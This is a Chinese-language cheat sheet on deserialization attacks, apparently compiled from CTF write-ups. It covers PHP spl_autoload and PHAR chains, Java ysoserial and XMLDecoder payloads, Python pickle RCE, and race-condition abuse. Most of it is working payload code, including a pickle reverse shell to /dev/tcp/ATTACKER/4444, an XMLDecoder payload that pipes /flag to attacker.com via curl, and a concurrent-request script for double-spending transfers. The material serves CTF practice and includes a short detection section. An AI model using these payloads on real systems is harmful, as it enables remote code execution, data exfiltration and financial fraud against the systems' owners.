# PHP反序列化漏洞知识库

## 攻击技术

### SPL Autoload 文件包含链

**触发条件**：
- `unserialize_callback_func` 设置为 `spl_autoload`
- 存在可控制的配置项
- `spl_autoload` 会尝试加载 `{类名}.inc` 或 `{类名}.php`

**攻击步骤**：
1. 利用 `__wakeup()` 设置 `unserialize_callback_func=spl_autoload`
2. 利用 `__destruct()` 写入恶意代码到 `settings.inc`
3. 反序列化不存在的类 `settings` 触发 `spl_autoload` 包含

**POC生成**：
```php
// Step 1: 写入代码
$inner = serialize("<?php system('cat /flag');");
$payload = 'O:4:"main":2:{s:8:"settings";a:1:{s:25:"unserialize_callback_func";s:12:"spl_autoload";}s:6:"params";s:' . strlen($inner) . ':"' . $inner . '"}';

// Step 2: 触发
$payload = 'O:4:"main":2:{s:8:"settings";a:1:{s:25:"unserialize_callback_func";s:12:"spl_autoload";}s:6:"params";s:19:"O:8:\"settings\":0:{}"}';
```

### PHAR利用

当文件操作函数（如 `file_exists`, `fopen`）接受phar://时：
```php
phar://path/to/phar.phar
```

## 检测特征

1. `__wakeup()` 中使用 `ini_set`
2. `__destruct()` 中使用 `file_put_contents`
3. `unserialize()` 嵌套
4. 类名与文件名关联（如 `settings.inc`）

## 常见Gadgets

参考 [PHPGGC](https://github.com/ambionics/phpggc):
- Laravel
- Symfony
- Zend Framework
- WordPress

## 防御绕过

### 绕过`__wakeup`
- CVE-2016-7124: 对象属性数量不匹配时`__wakeup`不执行
- 修改序列化字符串中的对象数量

### 绕过字符过滤
- `+` 号绕过 (URL编码为 `%2B`)
- 大写/小写类名

---

## 来自外部导入内容 (CTF Web - server-side-deser.md)

### Java 反序列化 (ysoserial)

**检测:**
- Base64 解码可疑 blob — Java 序列化数据以 magic bytes `AC ED 00 05` 开头
- 搜索 `ObjectInputStream`, `readObject`, `readUnshared`
- Content-Type `application/x-java-serialized-object`

```bash
# 使用 ysoserial 生成 payload
java -jar ysoserial.jar CommonsCollections1 'id' | base64
java -jar ysoserial.jar CommonsCollections6 'cat /flag.txt' > payload.ser

# 常用 gadget 链 (按顺序尝试):
# CommonsCollections1-7 (Apache Commons Collections)
# CommonsBeanutils1 (Apache Commons BeanUtils)
# URLDNS (无执行 — 用于盲检测的 DNS 回调)
# JRMPClient (触发 JRMP 连接)
# Spring1/Spring2 (Spring Framework)

# 盲检测通过 DNS 回调 (无需 RCE):
java -jar ysoserial.jar URLDNS 'http://attacker.burpcollaborator.net' | base64
```

**绕过过滤器:**
- 如果 `ObjectInputStream` 子类阻止特定类，尝试其他链
- JNDI 注入: `java -jar ysoserial.jar JRMPClient 'attacker:1099'` + `marshalsec` JNDI 服务器

### Python Pickle 反序列化

**检测:**
- Base64 blob 包含 `\x80\x04\x95` (pickle protocol 4) 或 `\x80\x05\x95` (protocol 5)
- Flask session 使用 `pickle` 序列化器 (vs 默认 `json`)

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)

# 反向 shell:
class RevShell:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',))
```

**绕过受限 unpickler:**
- 如果 `builtins` 允许: `(__builtins__.__import__, ('os',))` 然后链式调用 `.system()`
- YAML 反序列化 (`yaml.load()` 没有 `Loader=SafeLoader`) 通过 `!!python/object/apply:os.system` 有类似的 RCE

### 竞态条件 (TOCTOU)

**模式:** 服务器检查条件（余额、注册唯一性、优惠券有效性），然后在单独步骤中执行操作。检查和操作之间的并发请求绕过验证。

```python
import asyncio, aiohttp

async def race(url, data, headers, n=20):
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, json=data, headers=headers) for _ in range(n)]
        responses = await asyncio.gather(*tasks)
        for r in responses:
            print(r.status, await r.text())

asyncio.run(race('http://target/api/transfer',
    {'to': 'attacker', 'amount': 1000},
    {'Cookie': 'session=...'},
    n=50))
```

**常见 CTF 竞态目标:**
- **双重消费/余额绕过:** 50 个同时请求都看到原始余额
- **优惠券/代码重用:** 单次使用代码在标记前同时兑换
- **注册唯一性:** `if not user_exists(name)` → 同时注册相同用户名
- **文件上传+使用:** 在上传和验证之间访问文件

### Pickle 链通过 STOP Opcode 剥离 (VolgaCTF 2013)

```python
import pickle, os

class Redirect:
    def __reduce__(self):
        return (os.dup2, (5, 1))  # 重定向 stdout 到 socket fd 5

class Execute:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

# 从第一个 payload 剥离 STOP opcode，连接第二个
payload = pickle.dumps(Redirect())[:-1] + pickle.dumps(Execute())
```

### Java XMLDecoder 反序列化 RCE (HackIM 2016)

```xml
<object class="java.lang.Runtime" method="getRuntime">
  <void method="exec">
    <array class="java.lang.String" length="3">
      <void index="0"><string>/bin/sh</string></void>
      <void index="1"><string>-c</string></void>
      <void index="2"><string>curl attacker.com/?c=$(cat /flag)</string></void>
    </array>
  </void>
</object>
```

### PHP 序列化长度操作通过过滤器词扩展 (0CTF 2016)

```php
// 注入的有效载荷:
$payload = '";}s:5:"photo";s:10:"config.php";}';
// 重复 "where" 足够多次使扩展 (5->6 每词) 溢出
// 正好 strlen($payload) 字节:
$_POST['nickname[]'] = str_repeat("where", strlen($payload)) . $payload;
```

**原理:**
1. 应用将用户输入序列化为 `s:170:"wherewhere...PAYLOAD";`
2. 过滤器替换每个 "where" (5) 为 "hacker" (6)，每次添加 1 字节
3. 替换后，实际字符串比序列化长度字段长
4. PHP 反序列化器精确读取 `s:170:` 字节，在字符串中间停止
5. 注入的 `";}s:5:"photo";s:10:"config.php";}` 成为下一个序列化字段
